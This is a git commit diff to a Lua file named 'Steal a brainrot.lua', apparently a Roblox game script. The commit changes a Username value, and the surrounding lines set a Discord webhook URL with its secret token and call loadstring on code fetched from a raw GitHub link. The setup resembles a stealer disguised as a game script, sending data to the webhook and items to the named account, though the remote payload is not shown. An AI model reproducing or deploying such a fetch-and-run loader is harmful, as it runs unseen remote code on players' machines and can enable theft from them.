ad080b46778a1ccd164dd037fd4c0ea4087e241e
Fru1sik <fru1sik@gmail.com>
2025-08-11 01:20:30 +0500

    Update Steal a brainrot.lua

--- Steal a brainrot.lua
+++ Steal a brainrot.lua
@@ -1,4 +1,4 @@
 Webhook = "https://discord.com/api/webhooks/1404163340158242936/vMBpOOQP1Ql_9QnJ9SdhuRopu6B_R15EABMD8Yx2H7e306zg8DzJzgSwneU5RRmTVx4F"
-Username = "kur_ni"
+Username = "Sgahfd1223"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/wow1/refs/heads/main/f222",true))(
